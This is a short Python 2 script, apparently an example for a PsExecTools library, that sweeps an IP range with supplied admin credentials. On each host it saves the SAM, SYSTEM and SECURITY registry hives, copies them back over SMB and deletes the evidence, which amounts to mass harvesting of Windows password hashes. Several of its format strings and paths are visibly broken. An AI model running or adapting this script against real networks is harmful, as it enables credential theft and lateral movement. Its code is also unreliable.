#! /usr/bin/python

# This file is part of PsExecTools.
# Please see LICENSE for details.

from PsExecTools import PsExecTools
from netaddr import *

username = ""
domain = ""
password = ""

mytempdir = "C:\\mytempdir\\"

OUTPUT_DIR=""
ERROR_HOST = []

ips = IPNetwork("IP-RANGE-HERE")

for host in ips:
	try:
		psexec = PsExecTools(str(host), username, password, domain=domain)

		if psexec.isHostAlive():
			psexec.smb_mkdir("C:\\%s\\" % (mytempdir))

			psexec.command("cmd.exe /C reg save HKLM\\SAM C:\\%s\\SAM & reg save HKLM\\SYSTEM C:\\%s\\SYSTEM & reg save HKLM\\SECURITY C:\\%s\\SECURITY" % (mytempdir, mytempdir, mytempdir))

			psexec.smb_get_file("C:\\%s\\SAM", "%s/SAM_%s" % (mytempdir, OUTPUT_DIR, host))
			psexec.smb_get_file("C:\\%s\\SYSTEM", "%s/SYSTEM_%s" % (mytempdir, OUTPUT_DIR, host))
			psexec.smb_get_file("C:\\%s\\SECURITY", "%s/SECURITY_%s" % (mytempdir, OUTPUT_DIR, host))

			psexec.smb_del_file("C:\\%s\\SAM" % (mytempdir))
			psexec.smb_del_file("C:\\%s\\SYSTEM" % (mytempdir))
			psexec.smb_del_file("C:\\%s\\SECURITY" % (mytempdir))

			psexec.smb_clean()
			psexec._smb_close()
	except Exception as ex:
		ERROR_HOST.append((host, ex))
		continue

print "THE FOLLOWING HOST RAISED ERRORS"

for tup in ERROR_HOST:
	host, exception = tup
	print "%s raised: %s" % (host, exception)
